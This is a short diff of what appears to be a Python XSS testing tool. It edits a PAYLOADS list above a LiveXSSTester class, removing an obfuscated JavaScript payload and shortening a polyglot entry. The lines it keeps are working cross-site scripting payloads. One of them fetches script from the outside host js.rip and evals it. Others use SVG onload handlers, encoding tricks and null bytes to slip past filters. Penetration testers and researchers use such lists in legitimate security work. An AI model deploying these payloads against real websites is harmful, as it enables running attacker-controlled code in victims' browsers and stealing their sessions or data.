@@ -44,8 +44,7 @@ PAYLOADS = [
     "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"https://js.rip/shootweb\");a.send();</script>",
     "-->'\"/></sCript><svG x=\">\" onload=(co\u006efirm)``>",
     "<svg%0Ao%00nload=%09((pro\u006dpt))()//",
-    "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">",
-    "ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\"(ᨆ)\")()"
+    "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">"
 ]
 
 class LiveXSSTester:
